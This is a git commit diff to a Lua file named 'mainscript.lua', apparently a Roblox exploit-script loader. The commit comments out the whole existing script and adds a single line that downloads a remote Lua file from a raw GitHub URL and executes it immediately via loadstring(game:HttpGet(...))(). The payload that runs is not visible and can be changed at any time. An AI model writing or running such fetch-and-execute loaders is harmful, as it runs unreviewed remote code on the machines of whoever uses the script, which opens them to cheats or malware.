38f9d0f3b1966a182ead0dd1afdd0b200c166e37
lolnoobsloadstring <xlauraxox991@gmail.com>
2025-04-14 22:16:46 +0100

    Update mainscript.lua

--- loader/78637bcawubsg76c73/mainscript.lua
+++ loader/78637bcawubsg76c73/mainscript.lua
@@ -1,3 +1,5 @@
+--[[
+
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -647,3 +649,8 @@ spawn(function()
 		end
 	end
 end)
+
+
+]]
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/78637bcawubsg76c73/keyfinished.lua'))()
